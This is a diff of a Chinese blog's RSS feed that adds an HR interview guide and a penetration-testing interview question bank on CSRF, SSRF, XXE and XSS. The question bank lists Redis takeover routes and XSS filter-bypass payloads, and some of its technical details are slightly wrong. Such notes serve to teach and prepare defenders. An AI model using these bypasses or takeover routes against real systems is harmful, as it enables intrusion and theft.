-<p>如果没有适当的治理，您的数据湖就有可能成为“<a href="https://www.alation.com/blog/data-swamp-lake-lakehouse/" target="_blank" rel="noopener noreferrer">数据沼泽</a>”，信息杂乱无章且难以提取。您还应该在流程的早期建立数据组织、使用和访问规则。</p>
-<p>有效的数据治理<em>实际上</em>与组织无关，它对于满足 GDPR、HIPAA 或 <a href="https://www.splunk.com/en_us/blog/learn/soc-compliance.html" target="_blank" rel="noopener noreferrer">SOC 2</a> 等<a href="https://www.splunk.com/en_us/blog/learn/regulatory-compliance.html" target="_blank" rel="noopener noreferrer">法规遵从性标准</a>至关重要。确保适当的访问控制、审计跟踪和数据沿袭跟踪有助于企业避免法律陷阱并维护客户信任。</p>
-<h3>2. 优先考虑安全</h3>
-<p>通过实施强大的用户身份验证、加密和合规性监控来确保数据湖的安全性。<a href="https://aws.amazon.com/lake-formation/" target="_blank" rel="noopener noreferrer"> AWS Lake Formation</a> 等技术使组织能够无缝地完成这一过程。</p>
-<h3>3. 维护元数据以加快检索速度</h3>
-<p>包括元数据标记，以帮助用户有效地搜索、定位和检索数据。<a href="https://atlas.apache.org/#/" target="_blank" rel="noopener noreferrer"> Apache Atlas</a> 等工具可以帮助管理整个湖中的综合元数据。</p>
-<h3>4. 设计灵活的数据管道</h3>
-<p><a href="https://spark.apache.org/" target="_blank" rel="noopener noreferrer"> Apache Spark</a> 和<a href="https://aws.amazon.com/glue/" target="_blank" rel="noopener noreferrer"> AWS Glue</a> 等平台简化了提取、转换和加载数据的过程，而不会将您锁定在特定的架构要求中。这符合数据湖的流体存储理念。</p>
-<h3>5. 定期监控绩效</h3>
-<p>请务必密切关注用户查询、作业运行时和数据存储成本。尝试寻找瓶颈并优化作，以确保数据湖随着您的使用模式而发展。</p>
-<h3>6. 优化性能</h3>
-<p>主动优化数据湖可以显著提高性能并降低成本。</p>
-<ul>
-<li>按时间或类别对数据进行分区，通过缩小搜索范围来加快查询执行速度。</li>
-<li>使用 Parquet 或 ORC 等列式存储格式可提高读取效率并减少存储占用空间。</li>
-<li>实现查询加速层（例如，物化视图或缓存引擎）可以缩短重复查询的响应时间。</li>
-</ul>
-<p>这些实践共同确保你的数据湖高效存储数据，同时快速可靠地提供洞察。</p>
-<h3>7. 管理数据生命周期</h3>
-<p>随着数据湖的扩大，管理<a href="https://www.splunk.com/en_us/blog/learn/dlm-data-lifecycle-management.html" target="_blank" rel="noopener noreferrer">存储数据的生命周期</a>变得至关重要。并非所有数据都具有长期价值，因此实施策略——如归档、分层存储或自动删除陈旧数据集——有助于控制存储成本并优化性能。</p>
-<p>许多云服务提供商提供内置生命周期策略来自动化这一流程。</p>
-<figure><figcaption></figcaption></figure>
-<h2>管理数据湖的挑战（以及如何解决这些挑战）</h2>
-<p>虽然数据湖的优势引人注目，但也有一些挑战需要考虑：</p>
-<ul>
-<li><strong>数据质量差：</strong>  原始数据通常存在不一致、错误和重复。实施自动清理工具和数据验证管道，以确保高质量的输入。</li>
-<li><strong>压倒性的体积：</strong>  未经过滤的大量数据可能会让用户不知所措。实施高效的索引和元数据标记可以缓解这种情况。</li>
-<li><strong>用户访问复杂性：</strong>  新用户可能难以查询非结构化数据。为了克服这个问题，请投资用户友好的查询解决方案，例如 <a href="https://prestodb.io/" target="_blank" rel="noopener noreferrer">Presto</a> 或 <a href="https://www.integrate.io/blog/12-sql-on-hadoop-tools/" target="_blank" rel="noopener noreferrer">SQL-on-Hadoop 工具</a>。</li>
-</ul>
-<h2>数据湖的未来趋势</h2>
-<p>随着数据生态系统的发展，数据湖变得更加智能和统一。新兴趋势包括：</p>
-<ul>
-<li>用于自动标记和发现的 AI 驱动的数据编目</li>
-<li>将分析性能与灵活性融为一体的数据湖屋的兴起</li>
-<li>与实时流媒体平台更紧密地集成。</li>
-</ul>
-<p>组织也正在转向受监管的自助服务模式，允许更多团队在不大量 IT 参与的情况下访问和分析数据，同时保持控制和合规性。</p>
-<h2>利用数据湖的力量</h2>
-<p>精心设计的数据湖不仅仅是高级存储解决方案，还提供了统一组织数据的机会。</p>
-<p>要从不同和孤立的数据中引入新的业务洞察，请考虑立即为您的企业构建数据湖。</p>
-]]></content:encoded>
     </item>
     <item>
       <title>《悉达多》读书笔记</title>
@@ -7619,125 +7620,1304 @@ Finished：客户端和服务器各自计算并发送一个Finished数据包，�
 ]]></content:encoded>
     </item>
     <item>
-      <title>热💖生活</title>
+      <title>HR面试常见问题与应答策略</title>
+      <link>https://min168.top/com/job/HR%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E5%BA%94%E7%AD%94%E7%AD%96%E7%95%A5.html</link>
+      <guid>https://min168.top/com/job/HR%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E5%BA%94%E7%AD%94%E7%AD%96%E7%95%A5.html</guid>
+      <source url="https://min168.top/rss.xml">HR面试常见问题与应答策略</source>
+      <description>最近遇到的最大的挫折是什么？你是如何克服的？ 考察点：逆商(AQ) 面对挫折摆脱困难的能力。高逆商的人会透过消极因素，掌控局面。低逆商的人只会想着逃避。 面试官是想了解你承受工作压力的限度，日后不会因为在工作中遇到超出你能力范围内的工作时，直接被吓跑，做甩手掌柜，而是可以坚持把手上的工作做好。 例：在疫情的假期期间负责维护医院做核酸的打印机，当时打印机...</description>
+      <category>面试</category>
+      <pubDate>Sat, 08 Feb 2025 14:18:57 GMT</pubDate>
+      <content:encoded><![CDATA[<h4>最近遇到的最大的挫折是什么？你是如何克服的？</h4>
+<p>考察点：逆商(AQ)  面对挫折摆脱困难的能力。高逆商的人会透过消极因素，掌控局面。低逆商的人只会想着逃避。</p>
+<p>面试官是想了解你承受工作压力的限度，日后不会因为在工作中遇到超出你能力范围内的工作时，直接被吓跑，做甩手掌柜，而是可以坚持把手上的工作做好。</p>
+<p>例：在疫情的假期期间负责维护医院做核酸的打印机，当时打印机出现故障需要我马上处理，但是并没有处理成功，当时有很多在场等待做核酸的人员指责。我通过联系其他公司师傅帮忙处理，最终问题得到解决。</p>
+<h4>平时有没有买过技术类的相关书籍，比如？</h4>
+<p>考察点：对技术的兴趣、自学能力、持续学习态度</p>
+<p>例：经常买我平时会购买技术类书籍提升专业技能，比如《计算机网络》通过阅读这本书，我不仅学习了TCP/IP协议栈的工作原理，还深入了解了各种网络协议细节。我也会关注新技术的发展，定期购买和阅读相关的书籍，以保持自己的知识和技能与时俱进。</p>
+<h4>能不能接受偏远地方出差？</h4>
+<p>不能就说不能，能接受就说能接受，问清楚出差福利 报销制度等</p>
+<h4>你觉得自己最大的优势和劣势是什么？</h4>
+<p>优势：我认为我最大的优势是<strong>快速学习和适应能力</strong>。比如，在之前的实习中，我需要在短时间内掌握一项新技术来完成项目。我通过自学和请教同事，迅速上手并成功交付了任务。这种能力让我在面对新挑战时能够快速进入状态。”<br>
+劣势：我有时会过于<strong>追求细节</strong>，<strong>完美主义</strong>，导致在某些任务上<strong>花费的时间比预期多</strong>。不过，我已经意识到这一点，并正在通过制定优先级和时间管理工具来提高效率。比如，在最近的项目中，我学会了先完成核心任务，再优化细节，这让我更好地平衡了质量和效率。”</p>
+<h3><strong>对于我们公司了解多少？</strong></h3>
+<p>我了解到贵公司是一家专注于提供信息化项目建设及运维服务的企业，主要产品/服务包括[具体内容]。贵公司在[某领域]有很强的技术优势，并且在[某市场]占据了领先地位。此外，我注意到贵公司最近在[某项目/技术]上有新的突破，这让我对加入贵公司充满期待。”</p>
+<h3><strong>最近有没有其他面试，结果怎么样？</strong></h3>
+<p><strong>回答思路</strong>：诚实回答，但不要透露过多细节，重点表达对当前公司的兴趣。<br>
+我最近确实参加了几家公司的面试，但目前还在等待结果。不过，我对贵公司的岗位最感兴趣，因为[公司优势/岗位匹配度]，所以我更希望有机会加入贵公司。</p>
+<h3><strong>为什么会选择我们公司</strong></h3>
+<p><strong>回答思路</strong>：结合公司特点和个人职业规划，突出匹配度。<br>
+我选择贵公司是因为[<strong>公司行业地位/技术优势/文化]，这与我的职业发展方向非常契合</strong>。我希望在一个能够不断挑战自我、提升技术的环境中工作，<strong>而贵公司正好提供了这样的机会</strong>。</p>
+<h3><strong>能接受的薪资是多少？</strong></h3>
+<p><strong>回答思路</strong>：提前了解行业薪资水平，给出一个合理范围，并表达灵活性。<br>
+根据我的了解，这个岗位的薪资范围大概在[范围]之间。我对薪资有一定的期望，但更<strong>看重的是这个岗位的稳定性</strong>，所以我相信贵公司会给出一个合理的薪资。</p>
+<h3><strong>如果在客户服务过程中，客户告诉你，你发现的漏洞没有另一家公司的工程师多，这时候你应该如何应对？</strong></h3>
+<p><strong>回答思路</strong>：展现专业态度和解决问题的能力。<br>
+首先，我会冷静<strong>倾听客户的反馈</strong>，并感谢他们的意见。然后，我会仔细<strong>检查自己的工作</strong>，确认是否有遗漏。如果确实存在不足，我会立即<strong>改进</strong>；如果我的工作没有问题，我会向客户<strong>解释我们的工作重点和优势</strong>，强调我们提供的价值不仅仅是漏洞数量，而是整体解决方案的质量。</p>
+<h3><strong>简单的介绍一下你的实习经历。</strong></h3>
+<p><strong>回答思路</strong>：重点突出与应聘岗位相关的经验和技能。<br>
+“我曾在[公司名称]实习，主要负责[具体工作]。在实习期间，我学会了[技能]，并参与了[项目]，这让我对[某领域]有了更深入的理解。这段经历让我具备了[某能力]，我相信这对贵公司的岗位非常有帮助。”</p>
+<h3><strong>请问你如何看待公司的文化，比如我们这个岗位要求一天白班一天夜班。</strong></h3>
+<p><strong>回答思路</strong>：展现适应能力和积极态度。<br>
+“我理解这种排班方式是为了保证服务的连续性，我愿意接受这样的安排。我认为只要合理安排时间，保持良好的作息习惯，完全可以适应这种工作节奏。此外，我相信这种工作方式也能让我更快地成长。”</p>
+<h3><strong>说说你这些年来遇到过的最困难的一件事？</strong></h3>
+<p><strong>回答思路</strong>：选择一个真实的例子，重点突出你如何解决问题和从中学习。<br>
+我在[某项目/任务]中遇到了[具体困难]，当时[描述挑战]。我通过[具体行动]解决了问题，并从中学会了[某技能/经验]。这段经历让我更加坚韧，也让我明白了团队合作和沟通的重要性。”</p>
+<h3><strong>你平时是怎么学习新技术的？</strong></h3>
+<p><strong>回答思路</strong>：展现主动学习的能力和方法。<br>
+“我通常会通过在线课程、技术博客和官方文档来学习新技术。此外，我也会动手实践，比如通过项目或开源贡献来巩固所学。我还会参加技术社区的活动，与其他开发者交流，这让我能够更快地掌握新知识。”</p>
+<h3><strong>如果上级给你布置了很难的任务，并且你没办法搞定，你该如何和上级沟通？</strong></h3>
+<p><strong>回答思路</strong>：展现沟通能力和解决问题的思路。<br>
+“我会先尝试自己解决问题，如果确实无法搞定，我会及时向上级汇报，说明我遇到的困难和我已经尝试的解决方案。同时，我会提出一些可能的解决思路，并请求上级的指导或资源支持。”</p>
+<h3><strong>在遇到一个很难的任务时，上级愿意给你所有的支持，你会向他提什么样需求来解决该问题？</strong></h3>
+<p><strong>回答思路</strong>：具体说明需要的资源或支持。<br>
+我会请求上级提供更多的<strong>技术资料或培训机会</strong>，以便我更好地理解任务。如果需要，我也会请求团队中更有经验的同事协助，或者申请更多的时间来确保任务完成的质量。</p>
+<h3><strong>你在学校内最有挑战的事情？遇到的问题？如何解决的？</strong></h3>
+<p><strong>回答思路</strong>：选择一个有代表性的例子，突出你的能力和成长。<br>
+在学校期间，我参与了一个[项目/比赛]，当时遇到了[具体挑战（比如开发一个程序）]。我通过[具体行动（寻找资源借鉴学习）]解决了问题，并最终[取得的结果（比赛名次）]。这段经历让我学会了[某技能（开发）]，也让我更加自信。”</p>
+<h3><strong>你在学校内最有成就感的事情？为什么？你在其中又是什么角色？又解决了什么关键问题？</strong></h3>
+<p><strong>回答思路</strong>：突出你的贡献和成长。<br>
+我最有成就感的事情是[某项目/活动（开发）]，我在其中担任了[角色]。我们团队遇到了[问题]，我通过[具体行动]解决了[关键问题]，最终[取得的结果]。这段经历让我明白了[某道理]，也让我更加坚定了[某方向]。”</p>
+<h3><strong>你还有什么问题要问我？</strong></h3>
+<p><strong>回答思路</strong>：提出有深度的问题，展现对公司和岗位的兴趣。</p>
+<ul>
+<li>贵公司对这个岗位的长期发展有什么期望？</li>
+<li>团队目前面临的最大挑战是什么？</li>
+<li>贵公司对新员工有哪些培训或支持计划？</li>
+</ul>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+<p>​​</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>渗透测试面试题大全</title>
+      <link>https://min168.top/com/job/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98%E5%A4%A7%E5%85%A8.html</link>
+      <guid>https://min168.top/com/job/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98%E5%A4%A7%E5%85%A8.html</guid>
+      <source url="https://min168.top/rss.xml">渗透测试面试题大全</source>
+      <description>什么是CSRF，如何修复？(知道创宇) CSRF（跨站请求伪造）攻击是指攻击者诱使用户在已登录的情况下，执行恶意请求，利用用户的身份执行未授权的操作。 修复方式： 使用CSRF Token：在每个敏感请求中加入唯一的CSRF Token，确保请求是由合法用户发起的。 验证Referer头：检查请求的Referer​头部是否来自可信的源，防止跨站请求。 ...</description>
+      <category>面试</category>
+      <pubDate>Sat, 08 Feb 2025 14:18:57 GMT</pubDate>
+      <content:encoded><![CDATA[<h4><strong>什么是CSRF，如何修复？(知道创宇)</strong></h4>
+<p>CSRF（跨站请求伪造）攻击是指攻击者诱使用户在已登录的情况下，执行恶意请求，利用用户的身份执行未授权的操作。</p>
+<p><strong>修复方式</strong>：</p>
+<ul>
+<li><strong>使用CSRF Token</strong>：在每个敏感请求中加入唯一的CSRF Token，确保请求是由合法用户发起的。</li>
+<li><strong>验证Referer头</strong>：检查请求的<code>Referer</code>​头部是否来自可信的源，防止跨站请求。</li>
+<li><strong>SameSite Cookie属性</strong>：设置Cookie的SameSite属性，限制跨站请求中Cookie的发送。</li>
+<li><strong>避免使用GET请求进行敏感操作</strong>：将状态更改操作（如删除、更新）限制为POST请求，以降低被滥用的风险。</li>
+</ul>
+<h4>redis未授权访问漏洞有哪些利用方式？</h4>
+<p>web绝对路径写shell、写入ssh公钥获取服务器权限、主从复制getshell</p>
+<h4>csrf、ssrf区别？★面试被问</h4>
+<p>CSRF（Cross-Site Request Forgery，跨站请求伪造）和SSRF（Server-Side Request Forgery，服务器端请求伪造）</p>
+<p>CSRF是攻击者通过<strong>伪造用户提交请求</strong>。</p>
+<p>SSRF由于<span data-type="text" style="color: var(--b3-font-color8);">服务端对用户提供的可控URL地址过于信任，没有经过严格检测，对内部或外部资源的请求</span>。</p>
+<h4>CSRF的Token如何设计？</h4>
+<p>CSRF Token是一种用于防止跨站请求伪造的机制。它通过在用户请求中嵌入一个唯一的、由服务器生成的Token值，来验证请求的合法性。只有持有正确Token值的请求才会被服务器接受和处理。</p>
+<ol>
+<li>唯一性：每个用户会话或请求都应该有一个<span data-type="text" style="color: var(--b3-font-color10);">唯一的Token值</span>，以确保攻击者无法预测或重复使用。</li>
+<li>时效性：Token应该具有一定的时效性，<span data-type="text" style="color: var(--b3-font-color10);">过期后需要重新生成</span>。这可以防止攻击者使用截获的Token进行后续攻击。</li>
+<li>随机性：Token值应该是<span data-type="text" style="color: var(--b3-font-color10);">随机生成</span>的，且足够复杂，使得攻击者无法猜测或推断出正确的Token值。</li>
+</ol>
+<h4>CSRF和SSRF的区别及防御？★面试被问。</h4>
+<ul>
+<li>CSRF是服务器端没有对用户提交的数据进行<strong>随机值校验</strong>，且对http请求包内的refer字段校验不严，导致攻击者可以<strong>利用用户的cookie信息伪造用户请求</strong>发至服务器。</li>
+<li>SSRF是服务器<strong>对用户提供的可控URL过于信任</strong>，没有进行地址限制和严格的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</li>
+<li>防御：为了防御CSRF攻击，可以采取以下措施：使用验证码；检查Referer头；使用双因素认证；限制请求的来源IP等。为了防御SSRF攻击，可以采取以下措施：禁用不必要的协议；过滤和验证用户输入的URL；设置URL白名单；限制请求的端口和IP地址；统一错误信息以避免泄露敏感信息。</li>
+</ul>
+<h4>CSRF和XSS和XXE有什么区别，以及修复方式？</h4>
+<p>XSS 是<span data-type="text" style="color: var(--b3-font-color10);">跨站脚本攻击</span>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值、输入时校验、输出时采用 html 实体编码。</p>
+<p>CSRF 是<span data-type="text" style="color: var(--b3-font-color10);">跨站请求伪造攻击</span>，XSS 是实现 CSRF 的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范 CSRF 的页面然后嵌入 Token、再次输入密码、检验Referer</p>
+<p>XXE 是 <span data-type="text" style="color: var(--b3-font-color10);">XML 外部实体注入攻击</span>，XML 中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML 解析库在调用时严格禁止对外部实体的解析。</p>
+<h4>SSRF利用方式及修复方法？</h4>
+<p>Server-side Request Forgery；利用方法：1、访问内网资源。2、探测内网服务。3、发起Dos攻击。4、利用伪协议请求文件或构造恶意请求攻击特定的服务。修复方法：1、过滤用户输入的URL。2、限制服务端只能使用特定协议（HTTP/HTTPS）和端口。3、限制服务器只能只能访问特定资源或只能发起外部网络的请求，禁止访问内部网络。4、将服务器部署在DMZ区域。</p>
+<h4>SSRF的利用方式有哪些？</h4>
+<p>SSRF可通过构造恶意URL来读取本地文件、访问内网资源或进行远程命令执行。</p>
+<h4>SSRF常用哪些伪协议？</h4>
+<p>SSRF常用的伪协议包括file://、dict://、gopher://、ftp://、http://、<a href="https://xn--dxz" target="_blank" rel="noopener noreferrer">https://等</a>。</p>
+<h4>同源策略是什么？如何实现安全的跨域请求？（字节、知道创宇）</h4>
+<p>同源策略（Same Origin Policy）是浏览器的一种安全机制，用于限制不同源（即协议、域名或端口不同）的文档或脚本之间的交互操作。根据同源策略，浏览器只允许当前网页与同一源下的其他资源进行交互，包括读取和修改。这种限制有效地保护了用户的隐私和安全，阻止恶意网站通过跨域请求获取用户的敏感信息。</p>
+<h4>安全跨域有哪些方法可以实现？跨域请求的方式有哪些？（字节）</h4>
+<ul>
+<li>JSONP（JSON with Padding）跨域；</li>
+<li>CORS（Cross-Origin Resource Sharing）跨域资源共享；</li>
+<li>代理服务器转发跨域请求。</li>
+<li>使用Nginx反向代理。</li>
+<li>使用postMessage方法。</li>
+<li>WebSocket协议跨域</li>
+</ul>
+<h4><strong>什么是JSONP劫持原理，如何修复？</strong></h4>
+<p>JSONP（JSON with Padding）劫持利用了浏览器的跨域请求机制，攻击者通过伪造响应来劫持返回的数据。具体原理是利用 <code>&lt;script&gt;</code>​ 标签可以跨域加载外部资源的特性，攻击者诱导用户访问恶意站点，从而获取响应数据并执行恶意脚本。</p>
+<p><strong>修复方式</strong>：</p>
+<ul>
+<li><strong>禁止使用JSONP</strong>：避免使用JSONP，改为采用跨域资源共享（CORS）等更安全的方式进行跨域请求。</li>
+<li><strong>验证回调函数</strong>：如果必须使用JSONP，确保服务器验证回调函数的合法性，避免恶意脚本注入。</li>
+<li><strong>使用HTTP Only和Secure标志</strong>：确保敏感信息存储在Cookie中时设置为HTTP Only和Secure标志，防止通过跨站脚本攻击（XSS）盗取。</li>
+</ul>
+<h4>CORS原理、利用及修复？（字节）</h4>
+<p>Cross-Origin Resource Sharing；浏览器的同源策略限制了不同域之间的资源请求，即一个域下的网页无法直接通过Ajax等方式访问另一个域下的资源。CORS机制解决了这个问题，它允许浏览器向不同域发送跨域请求，并获取相应的数据。</p>
+<p>利用：</p>
+<p>1、构造恶意请求来获取敏感数据。</p>
+<p>2、攻击者可以构造一个恶意网页发起CSRF，诱导用户访问该网页并触发恶意的跨域请求。</p>
+<p>修复：</p>
+<p>1、设置Access-Control-Allow-Origin响应头来指定允许的源。且避免使用通配符（*）</p>
+<p>2、设置Access-Control-Allow-Methods响应头来限制允许的HTTP请求方法。例如，只允许GET和POST方法，而禁止PUT、DELETE等可能具有破坏性的方法。</p>
+<p>3、设置Access-Control-Allow-Headers响应头来限制允许的请求头。这可以防止攻击者通过添加自定义请求头来绕过安全限制。</p>
+<h4>XXE注入漏洞原理与危害? (奇安信、知道创宇)</h4>
+<p>XML External Entity Injection，<strong>XML外部实体注入漏洞</strong>。应用程序在解析XML输入时，未能正确处理或限制外部实体（External Entities）的引用。攻击者可以强制<strong>XML解析器</strong>去访问攻击者指定的资源内容（可能是系统上本地文件或远程系统上的文件）。</p>
+<ul>
+<li>XXE漏洞的危害包括加载<span data-type="text" style="color: var(--b3-font-color8);">恶意外部文件、造成文件读取、内网端口扫描、攻击内网网</span>站以及发起DOS攻击等。</li>
+</ul>
+<h4>XXE外部实体注入无回显怎么办？</h4>
+<ol>
+<li>数据外带到第三方服务器</li>
+<li>空格绕过</li>
+<li>编码绕过</li>
+</ol>
+<h4>XXE命令执行的协议是什么？</h4>
+<p>XXE命令执行的协议可以是file://、http://、<a href="ftp://%E7%AD%89" target="_blank" rel="noopener noreferrer">ftp://等</a>。</p>
+<h4>XXE无回显怎么办？</h4>
+<p>可以通过分析XML解析器的日志、错误消息或调试信息来间接获取敏感信息，或者利用其他漏洞（如SQL注入）来辅助确认XXE漏洞的存在。</p>
+<h4><strong>什么是CSP（内容安全策略）？</strong></h4>
+<p>CSP（Content Security Policy）是一种Web安全标准，旨在防止跨站脚本（XSS）等攻击。通过指定允许加载的内容源，CSP限制浏览器加载外部资源，如脚本、样式表、图像等，从而减少恶意代码的执行风险。</p>
+<p>CSP通过设置<code>Content-Security-Policy</code>​ HTTP头部或HTML中的<code>&lt;meta&gt;</code>​标签来实现。配置规则包括限制脚本的来源、样式的来源、图片的来源等，确保只有可信的资源能够被加载和执行。</p>
+<h4>XSS原理是什么？（字节、知道创宇）</h4>
+<p>Web应用程序对用户输入过滤不足，导致攻击者能够将恶意脚本注入到网页中，当用户浏览这些被注入恶意脚本的网页时，其浏览器就会解析并执行这些脚本，从而使用户的浏览器被攻击者控制，达到攻击者的目的。</p>
+<h4>XSS进行哪些利用/危害?</h4>
+<p>1、会话劫持：使用document.cookie（）获取受害者cookie，从而登录网站。</p>
+<p>2、钓鱼攻击：通过伪装的网页窃取用户凭证。</p>
+<p>3、恶意操作：可以执行任意JavaScript代码，获取键盘记录或导致系统破坏或数据丢失。</p>
+<h4>XSS的三种类别有什么不同?</h4>
+<p>反射型与后端<span data-type="text" style="color: var(--b3-font-color10);">通信</span>，DOM型<span data-type="text" style="color: var(--b3-font-color10);">不需要与后端通信</span>，前两者<span data-type="text" style="color: var(--b3-font-color10);">不保存在数据库</span>，每次执行漏洞只能进行<span data-type="text" style="color: var(--b3-font-color10);">一次攻击</span>。而存储型将JS代码保存在数据库中，每次读取数据时，都会执行JS代码。</p>
+<h4>XSS注入漏洞发生的功能?</h4>
+<p>XSS跨站脚本攻击主要发生在<span data-type="text" style="color: var(--b3-font-color8);">用户输入数据并被服务器反射或存储到页面上</span>，<span data-type="text" style="color: var(--b3-font-color8);">且未经过适当的验证或编码时</span>。例如，用户提交的数据通过<span data-type="text" style="color: var(--b3-font-color8);">搜索框、留言板、评论区</span>等功能点被服务器反射回页面，或者通过注册、发布文章等功能点被存储到服务器上。</p>
+<p>‍</p>
+<h4><strong>XSS常见的检测方法有哪些？(深信服)</strong></h4>
+<p><strong>手动测试</strong>：通过手动插入常见的XSS攻击代码（如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>​）来检查页面是否存在反射型XSS漏洞。对于存储型XSS，可以上传类似代码并查看是否在页面中回显。</p>
+<p><strong>自动化扫描工具</strong>：使用安全扫描工具（如 Burp Suite, OWASP ZAP）对网站进行自动化测试，这些工具能够检测常见的XSS漏洞。</p>
+<p><strong>静态代码分析</strong>：对Web应用的源代码进行静态分析，查找潜在的XSS漏洞点，特别是对输入没有进行充分验证或输出未进行正确转义的地方。</p>
+<p><strong>动态分析</strong>：通过在浏览器中对应用进行动态分析，监控响应内容中的未处理的用户输入，并判断是否会在页面中执行恶意脚本。</p>
+<p><strong>内容安全策略（CSP）测试</strong>：测试网站是否实现了CSP，并验证CSP的配置是否足以防止XSS攻击。</p>
+<p>‍</p>
+<h4><strong>XSS绕过的常见方法有哪些？（深信服）</strong></h4>
+<p><strong>事件处理属性绕过</strong>：通过注入事件处理程序（如<code>&lt;img src="x" onerror="alert(1)"&gt;</code>​）来执行恶意脚本。例如，使用<code>onerror</code>​, <code>onclick</code>​等事件触发脚本执行。</p>
+<p><strong>HTML标签属性绕过</strong>：在HTML标签属性中使用不常见的编码或分隔符，绕过一些简单的输入验证。比如：<code>&lt;img src="javascript:alert(1)"&gt;</code>​ 变为 <code>&lt;img src= 'jav&amp;#x09;ascript:alert(1)'&gt;</code>​。</p>
+<p><strong>字符编码绕过</strong>：利用不同的编码方式绕过过滤器，比如使用<code>%20</code>​（URL编码的空格）代替空格，或使用Unicode编码字符等。</p>
+<p><strong>DOM-based XSS绕过</strong>：通过直接操作DOM来绕过传统的XSS检测机制。例如，攻击者可以通过在页面加载时操控URL的参数来执行恶意代码，或者利用<code>document.location</code>​、<code>document.cookie</code>​等DOM属性。</p>
+<p><strong>Base64编码绕过</strong>：将脚本内容转为Base64编码格式，然后再利用某些浏览器解析Base64的特性绕过过滤器，例如<code>data:text/html;base64,&lt;script&gt;alert(1)&lt;/script&gt;</code>​。</p>
+<p><strong>JSONP和iframe绕过</strong>：利用JSONP或iframe标签将恶意代码注入到目标站点。这种方式利用浏览器对不同源的宽松安全策略（如跨域策略）。</p>
+<p><strong>XHR绕过</strong>：使用XMLHttpRequest（XHR）来发送恶意请求，通过修改HTTP请求头或请求体中的内容来绕过XSS过滤器。</p>
+<p><strong>绕过特定的WAF规则</strong>：通过多层嵌套、编码、特殊字符替代等方法绕过WAF的过滤规则。例如，使用多种编码（HTML实体编码、URL编码等）组合来混淆恶意载荷。</p>
+<p>‍</p>
+<h4><strong>防止XSS攻击的方法有哪些？（字节、知道创宇）</strong></h4>
+<p><strong>输入验证和白名单</strong>：对用户输入进行严格验证，使用白名单方式限制输入的字符和格式，避免输入恶意的脚本代码。</p>
+<p><strong>输出编码</strong>：对所有用户输入的内容进行适当的HTML、JavaScript、URL等编码。确保在输出到网页时，恶意脚本被当作文本而不是可执行代码。</p>
+<p><strong>HTTP响应头的设置</strong>：设置 <code>X-XSS-Protection</code>​ 和 <code>Content-Security-Policy</code>​（CSP）等响应头，增强浏览器的安全性，防止恶意脚本的执行。</p>
+<p><strong>HttpOnly和Secure Cookie</strong>：使用HttpOnly标志防止Cookie被JavaScript访问，使用Secure标志确保Cookie仅通过HTTPS传输。</p>
+<p><strong>使用框架和库的安全功能</strong>：使用现代的Web框架和库（如React、Angular、Vue）来自动处理输出编码和输入验证，以减少XSS漏洞的风险。</p>
+<p><strong>避免使用不安全的API</strong>：避免使用容易导致XSS的API，例如<code>document.write()</code>​、<code>innerHTML</code>​等，应该使用更安全的方法（如<code>textContent</code>​、<code>createElement</code>​等）。</p>
+<p><strong>Web应用防火墙（WAF）</strong> ：部署WAF来过滤已知的XSS攻击载荷，拦截和防御恶意请求。</p>
+<p><strong>安全审计和渗透测试</strong>：定期进行安全审计和渗透测试，及时发现和修复XSS漏洞。</p>
+<p>‍</p>
+<h4><strong>浏览器保护Cookie的方法有哪些？</strong></h4>
+<p>为了提高安全性，浏览器提供了多种保护Cookie的机制，避免敏感信息泄露或遭受攻击。常见的保护方法包括：</p>
+<ul>
+<li>
+<p><strong>HttpOnly</strong>：设置<code>HttpOnly</code>​标志，确保Cookie只能通过HTTP请求访问，无法通过JavaScript脚本访问，从而防止XSS攻击窃取Cookie。</p>
+</li>
+<li>
+<p><strong>Secure</strong>：设置<code>Secure</code>​标志，确保Cookie只通过HTTPS协议传输，防止Cookie在不安全的HTTP连接中被窃取。</p>
+</li>
+<li>
+<p><strong>SameSite</strong>：设置<code>SameSite</code>​属性为<code>Strict</code>​或<code>Lax</code>​，限制浏览器在跨站请求中携带Cookie，从而防止CSRF攻击。</p>
+<ul>
+<li>​<code>Strict</code>​：完全禁止跨站请求携带Cookie。</li>
+<li>​<code>Lax</code>​：允许某些类型的跨站请求（如GET请求）携带Cookie。</li>
+</ul>
+</li>
+<li>
+<p><strong>Domain</strong>：设置<code>Domain</code>​属性，确保Cookie只对特定的子域有效，防止不同域之间的Cookie泄露。</p>
+</li>
+<li>
+<p><strong>Path</strong>：通过设置<code>Path</code>​属性限制Cookie在特定路径下有效，减少Cookie的暴露范围。</p>
+</li>
+</ul>
+<h4>如何利用XSS让影响最大化？</h4>
+<p>代码注入攻击。攻击者通过在目标网站上注入恶意脚本；1、窃取用户的敏感信息，如登录凭证、信用卡信息等。2、通过恶意脚本劫持用户的会话，从而以用户的身份进行各种操作，如非法转账、强制发表日志、发送电子邮件等。3、<span data-type="text" style="color: var(--b3-font-color10);">恶意脚本可以下载并执行恶意软件，从而进一步危害用户的计算机安全。</span>4、通过XSS攻击，攻击者可以冒充可信的网站或用户，诱骗受害者点击恶意链接或下载恶意附件，从而进一步窃取信息或进行其他恶意操作。5、篡改网页内容，如插入广告、恶意链接等。为了防止XSS攻击，网站开发者需要对用户输入的内容进行严格的过滤和编码</p>
+<h4><strong>什么是 RMI 漏洞？</strong></h4>
